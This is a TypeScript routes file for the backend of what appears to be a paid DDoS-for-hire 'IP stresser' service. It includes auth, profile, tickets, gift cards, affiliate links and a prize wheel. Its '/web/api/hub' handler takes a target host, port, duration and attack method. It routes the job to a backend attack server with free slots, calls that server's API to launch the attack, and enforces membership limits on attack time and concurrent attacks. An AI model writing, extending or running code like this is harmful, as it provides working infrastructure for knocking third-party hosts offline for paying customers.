/**
 * ============================================================================
 * WEB ROUTES - SaaS auth APIs, hub, profile, tickets, giftcards, affiliate,
 * wheel. Pages render via views/web-pages.ts; every handler below is a direct
 * port of the audited Next.js route handlers (same guards, limits, responses).
 * ============================================================================
 */

import { Application } from '../core/01-application';
import { Context } from '../core/03-context';
import { HttpError } from '../core/09-errors';
import { webSessions, requireWebUser } from './guards';
import { features } from '../config/features';
import { rateLimit } from '../lib/rate-limit';
import { webDb } from '../lib/db/web';
import { webLoginSchema, webRegisterSchema } from '../lib/validations/web-auth';
import { render } from '../core/views';
import bcrypt from 'bcryptjs';

type Body = Record<string, unknown>;

/** Shared guard: valid session + existing user row; returns the user. */
async function currentUser(ctx: Context) {
    const session = await requireWebUser(ctx);
    const user = await webDb.users.findUnique({ where: { ID: session.userId! } });
    if (!user) ctx.throw(404, 'User not found');
    return user;
}

export function registerWebRoutes(app: Application): void {
    // ------------------------------------------------------------------ auth
    app.post('/web/api/auth/login', async (ctx) => {
        if (!rateLimit('web-login:' + ctx.ip, 10, 60_000)) {
            throw new HttpError(429, 'Too many login attempts. Try again in a minute.');
        }
        const form = await ctx.body(webLoginSchema);
        const user = await webDb.users.findFirst({ where: { username: form.username } });
        if (!user) throw new HttpError(401, 'The username does not exist in our system.');
        if (Number(user.status) === 1) throw new HttpError(403, 'Your account has been banned.');
        const valid = await bcrypt.compare(form.password, user.password);
        if (!valid) throw new HttpError(401, 'The password you entered is invalid.');
        await webSessions.save(ctx, {
            userId: user.ID,
            username: user.username,
            rank: Number(user.rank),
        });
        ctx.redirect('/web/dashboard');
    });

    app.get('/web/api/auth/logout', async (ctx) => {
        webSessions.destroy(ctx);
        ctx.redirect('/web/login');
    });

    app.post('/web/api/auth/register', async (ctx) => {
        if (!rateLimit('register:' + ctx.ip, 5, 3_600_000)) {
            throw new HttpError(429, 'Too many registration attempts. Try again later.');
        }
        const form = await ctx.body();
        const parsed = webRegisterSchema.safeParse(form);
        if (!parsed.success) {
            throw new HttpError(400, parsed.error.issues[0]?.message ?? 'Validation failed');
        }
        // Optional reCAPTCHA when keys are configured.
        const recaptcha = String((form as Body)['g-recaptcha-response'] ?? '');
        const secret = process.env.RECAPTCHA_SECRET_KEY;
        if (secret && recaptcha && features.recaptcha) {
            const verify = await fetch('https://www.google.com/recaptcha/api/siteverify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `secret=${secret}&response=${recaptcha}`,
            }).then((r) => r.json() as Promise<{ success?: boolean }>);
            if (!verify.success) throw new HttpError(400, 'Captcha verification failed.');
        }
        const existing = await webDb.users.findFirst({
            where: { username: parsed.data.username },
        });
        if (existing) throw new HttpError(409, 'Username is already taken');

        const hashedPassword = await bcrypt.hash(parsed.data.password, 12);
        const trialDate = new Date();
        trialDate.setDate(trialDate.getDate() + 7);
        const newUser = await webDb.users.create({
            data: {
                username: parsed.data.username,
                password: hashedPassword,
                rank: 0,
                membership: 0,
                expire: Math.floor(trialDate.getTime() / 1000),
                status: 0,
                referral: '0',
                referralbalance: 0,
                testattack: 0,
                activity: 0,
                twoauth: 0,
                referedBy: 0,
            },
        });
        await webSessions.save(ctx, {
            userId: newUser.ID,
            username: newUser.username,
            rank: Number(newUser.rank),
        });
        ctx.json({ success: 'You have successfully registered! Redirecting...' });
    });

    // ------------------------------------------------------------- dashboard
    app.get(
        '/web/dashboard',
        async (ctx) => {
            const user = await currentUser(ctx);
            const plan = user.membership
                ? await webDb.plans.findUnique({ where: { ID: user.membership } })
                : null;
            const runningAttacks = await webDb.logs.count({
                where: { user: user.username, stopped: 0, time: { gt: 0 } },
            });
            const totalAttacks = await webDb.logs.count({ where: { user: user.username } });
            const planName = plan ? plan.name : 'No membership';
            const maxTime = plan ? `${plan.mbt}s` : 'No membership';
            const maxConc = String(plan?.concurrents ?? '-');
            const exp = new Date(user.expire * 1000).toLocaleDateString('en-US');
            ctx.htmlRaw(
                render('web-dashboard', {
                    planName,
                    maxTime,
                    maxConcurrents: maxConc,
                    expiry: exp,
                    runningAttacks,
                    totalAttacks,
                })
            );
        },
        { guard: 'webUser' }
    );

    // ------------------------------------------------------------------ hub
    app.get(
        '/web/hub',
        async (ctx) => {
            await requireWebUser(ctx);
            const [methods, servers] = await Promise.all([
                webDb.methods.findMany({
                    select: { id: true, name: true, fullname: true },
                    orderBy: { name: 'asc' },
                }),
                webDb.api.findMany({
                    select: { id: true, name: true, slots: true },
                    orderBy: { name: 'asc' },
                }),
            ]);
            ctx.htmlRaw(
                render('web-hub', { methods: methods as never[], servers: servers as never[] })
            );
        },
        { guard: 'webUser' }
    );

    app.post(
        '/web/api/hub',
        async (ctx) => {
            if (!features.ipstress) {
                ctx.json({ error: 'This feature is disabled.' }, 403);
                return;
            }
            if (!rateLimit('hub:' + ctx.ip, 20, 60_000)) {
                ctx.json({ error: 'Rate limit exceeded.' }, 429);
                return;
            }
            const user = await currentUser(ctx);
            if (Number(user.membership) === 0) {
                ctx.json({ error: 'You need an active membership to launch attacks.' }, 403);
                return;
            }
            const now = Math.floor(Date.now() / 1000);
            if (user.expire && user.expire < now) {
                ctx.json({ error: 'Your membership has expired.' }, 403);
                return;
            }
            const plan = await webDb.plans.findUnique({ where: { ID: user.membership } });
            if (!plan) throw new HttpError(500, 'Your plan no longer exists.');

            const form = await ctx.form();
            const host = form.host?.trim();
            const port = form.port?.trim() || '80';
            const timeStr = form.time?.trim();
            const methodName = form.method?.trim();
            const serverName = form.server?.trim();
            if (!host || !timeStr || !methodName) {
                throw new HttpError(400, 'Host, time, and method are required.');
            }
            const attackTime = parseInt(timeStr, 10);
            if (isNaN(attackTime) || attackTime <= 0 || attackTime > 3600) {
                throw new HttpError(400, 'Invalid attack time.');
            }
            const portNum = parseInt(port, 10);
            if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
                throw new HttpError(400, 'Invalid port. Must be between 1 and 65535.');
            }
            if (attackTime > plan.mbt) {
                throw new HttpError(400, `Max attack time for your plan is ${plan.mbt}s.`);
            }
            const runningCount = await webDb.logs.count({
                where: { user: user.username, stopped: 0, time: { gt: 0 } },
            });
            if (runningCount >= plan.concurrents) {
                ctx.json(
                    {
                        error: `Concurrent attack limit reached (${plan.concurrents}). Wait for a running attack to finish.`,
                    },
                    429
                );
                return;
            }
            const settings = await webDb.settings.findFirst({
                select: { cooldownTime: true },
            });
            const cooldownSeconds = settings?.cooldownTime ?? 0;
            if (cooldownSeconds > 0) {
                const last = await webDb.logs.findFirst({
                    where: { user: user.username },
                    orderBy: { date: 'desc' },
                    select: { date: true },
                });
                const elapsed = last ? now - last.date : Infinity;
                if (elapsed < cooldownSeconds) {
                    ctx.json(
                        {
                            error: `Cooldown active. Please wait ${cooldownSeconds - elapsed} seconds.`,
                        },
                        429
                    );
                    return;
                }
            }

            let apiServer = serverName
                ? await webDb.api.findFirst({ where: { name: serverName } })
                : undefined;
            if (!apiServer) {
                const all = await webDb.api.findMany();
                const matching = (all as Array<{ methods: string; name: string; slots: number }>)
                    .filter((s) =>
                        s.methods
                            .split(',')
                            .map((m) => m.trim().toUpperCase())
                            .includes(methodName.toUpperCase())
                    )
                    .map((s) => ({ ...s, active: -1 }));
                if (matching.length === 0) {
                    throw new HttpError(400, 'No API server supports the selected method.');
                }
                let lowest = Infinity;
                for (const s of matching) {
                    const activeOnServer = await webDb.logs.count({
                        where: { stopped: 0, handler: s.name, time: { gt: 0 } },
                    });
                    s.active = activeOnServer;
                    const available = s.slots - activeOnServer;
                    if (available > 0 && activeOnServer < lowest) {
                        lowest = activeOnServer;
                        apiServer = s;
                    }
                }
                if (lowest === Infinity) {
                    ctx.json({ error: 'All API servers are at full capacity.' }, 429);
                    return;
                }
            }

            const attackUrl = apiServer.api
                .replace(/\[host\]/gi, host)
                .replace(/\[port\]/gi, port)
                .replace(/\[time\]/gi, String(attackTime))
                .replace(/\[method\]/gi, methodName);
            let attackSuccess = false;
            try {
                const res = await fetch(attackUrl, {
                    method: 'GET',
                    signal: AbortSignal.timeout(10000),
                });
                attackSuccess = res.ok;
            } catch {
                // Logged even when unreachable (parity with legacy behavior).
            }
            await webDb.logs.create({
                data: {
                    user: user.username,
                    ip: host,
                    time: attackTime,
                    method: methodName,
                    postdata: port,
                    mode: 'api',
                    ratelimit: '0',
                    cookie: '0',
                    date: now,
                    chart: new Date(now * 1000).toISOString().slice(0, 19).replace('T', ' '),
                    stopped: 0,
                    handler: apiServer.name,
                    origin: 'web',
                },
            });
            if (!attackSuccess) {
                ctx.json(
                    { error: 'Attack was logged but the API server may be unreachable.' },
                    500
                );
                return;
            }
            ctx.json({
                success: `Attack launched on ${host}:${port} for ${attackTime}s using ${methodName}.`,
            });
        },
        { guard: 'webUser' }
    );

    app.get(
        '/web/api/hub/stats',
        async (ctx) => {
            await requireWebUser(ctx);
            const runningAttacks = await webDb.logs.findMany({
                where: { stopped: 0, time: { gt: 0 } },
                select: {
                    id: true,
                    user: true,
                    ip: true,
                    time: true,
                    method: true,
                    postdata: true,
                    handler: true,
                    date: true,
                    origin: true,
                },
                orderBy: { date: 'desc' },
            });
            ctx.json({ runningAttacks });
        },
        { guard: 'webUser' }
    );

    // --------------------------------------------------------------- profile
    app.get(
        '/web/profile',
        async (ctx) => {
            const user = await currentUser(ctx);
            const plan = user.membership
                ? await webDb.plans.findUnique({ where: { ID: user.membership } })
                : null;
            ctx.htmlRaw(
                render('web-profile', {
                    user,
                    plan,
                    expiry: new Date(user.expire * 1000).toLocaleDateString('en-US'),
                    refLink: user.referral
                        ? `https://ipstress.com/web/register?ref=${user.referral}`
                        : 'N/A',
                })
            );
        },
        { guard: 'webUser' }
    );

    app.post(
        '/web/api/profile/password',
        async (ctx) => {
            const user = await currentUser(ctx);
            const f = await ctx.form();
            const oldP = f.old?.trim();
            const newP = f.new?.trim();
            const repP = f.rnew?.trim();
            if (!oldP || !newP || !repP) {
                throw new HttpError(400, 'All fields are required.');
            }
            if (newP.length < 6) {
                throw new HttpError(400, 'New password must be at least 6 characters.');
            }
            if (newP !== repP) throw new HttpError(400, 'Passwords do not match.');
            const valid = await bcrypt.compare(oldP, user.password);
            if (!valid) throw new HttpError(401, 'Current password is incorrect.');
            await webDb.users.update({
                where: { ID: user.ID },
                data: { password: await bcrypt.hash(newP, 12) },
            });
            ctx.json({ success: 'Password changed successfully.' });
        },
        { guard: 'webUser' }
    );

    // -------------------------------------------------------------- giftcards
    app.post(
        '/web/api/giftcards/redeem',
        async (ctx) => {
            const user = await currentUser(ctx);
            const f = await ctx.form();
            const code = f.code?.trim();
            if (!code) throw new HttpError(400, 'Gift card code is required.');
            const card = await webDb.giftcards.findFirst({
                where: { code, claimedby: 0 },
            });
            if (!card) {
                throw new HttpError(400, 'Invalid or already claimed gift card code.');
            }
            const plan = await webDb.plans.findUnique({ where: { ID: card.planID } });
            if (!plan) {
                throw new HttpError(400, 'Plan associated with this gift card no longer exists.');
            }
            const now = Math.floor(Date.now() / 1000);
            await webDb.users.update({
                where: { ID: user.ID },
                data: { membership: plan.ID, expire: now + plan.length * 86400 },
            });
            await webDb.giftcards.update({
                where: { ID: card.ID },
                data: { claimedby: user.ID, dateClaimed: now },
            });
            ctx.json({ success: `Gift card redeemed! You now have the ${plan.name} plan.` });
        },
        { guard: 'webUser' }
    );

    // -------------------------------------------------------------- affiliate
    app.get(
        '/web/api/affiliate',
        async (ctx) => {
            const user = await currentUser(ctx);
            const referralLink = user.referral
                ? `https://ipstress.com/web/register?ref=${user.referral}`
                : 'N/A';
            const referralCount = await webDb.users.count({
                where: { referedBy: user.ID },
            });
            ctx.json({
                referralLink,
                referralCount,
                referralBalance: user.referralbalance,
            });
        },
        { guard: 'webUser' }
    );

    // ------------------------------------------------------------------ wheel
    app.post(
        '/web/api/wheel/spin',
        async (ctx) => {
            const user = await currentUser(ctx);
            const PRIZES = [
                { id: 0, name: '10\u00a5 Balance', points: 10 },
                { id: 1, name: '5 Extra Attack Seconds', points: 0 },
                { id: 2, name: '50\u00a5 Balance', points: 50 },
                { id: 3, name: 'No Prize', points: 0 },
                { id: 4, name: '20\u00a5 Balance', points: 20 },
                { id: 5, name: '1 Hour VIP', points: 0 },
                { id: 6, name: '100\u00a5 Balance', points: 100 },
                { id: 7, name: 'No Prize', points: 0 },
            ];
            const prizeIndex = Math.floor(Math.random() * PRIZES.length);
            const prize = PRIZES[prizeIndex];
            if (prize.points > 0) {
                // Read-modify-write (shim has no SQL-level increment).
                const fresh = await webDb.users.findUnique({
                    where: { ID: user.ID },
                    select: { referralbalance: true },
                });
                await webDb.users.update({
                    where: { ID: user.ID },
                    data: { referralbalance: (fresh?.referralbalance ?? 0) + prize.points },
                });
            }
            ctx.json({ prize: prizeIndex, prizeName: prize.name, points: prize.points });
        },
        { guard: 'webUser' }
    );

    // ---------------------------------------------------------------- tickets
    app.post(
        '/web/api/tickets',
        async (ctx) => {
            const user = await currentUser(ctx);
            const f = await ctx.form();
            const subject = f.subject?.trim();
            const content = f.content?.trim();
            if (!subject || !content) {
                throw new HttpError(400, 'Subject and content are required.');
            }
            const ticket = await webDb.tickets.create({
                data: {
                    subject,
                    content,
                    status: 'Waiting for admin response',
                    username: user.username,
                    date: Math.floor(Date.now() / 1000),
                },
            });
            ctx.json({ success: 'Ticket created successfully', id: ticket.id });
        },
        { guard: 'webUser' }
    );

    app.post(
        '/web/api/tickets/:id',
        async (ctx) => {
            const user = await currentUser(ctx);
            const ticketId = Number(ctx.params.id);
            const ticket = await webDb.tickets.findUnique({ where: { id: ticketId } });
            if (!ticket) throw new HttpError(404, 'Ticket not found');
            if (user.username !== ticket.username && Number(user.rank) < 1) {
                ctx.throw(403, 'Forbidden');
            }
            if (ticket.status === 'Closed') {
                throw new HttpError(400, 'Ticket is closed');
            }
            const f = await ctx.form();
            const content = f.content?.trim();
            if (!content) throw new HttpError(400, 'Reply content is required.');
            const now = Math.floor(Date.now() / 1000);
            await webDb.messages.create({
                data: { ticketid: ticket.id, content, sender: user.username, date: now },
            });
            await webDb.tickets.update({
                where: { id: ticket.id },
                data: { status: 'Waiting for admin response' },
            });
            ctx.json({ success: 'Reply sent successfully' });
        },
        { guard: 'webUser' }
    );
}
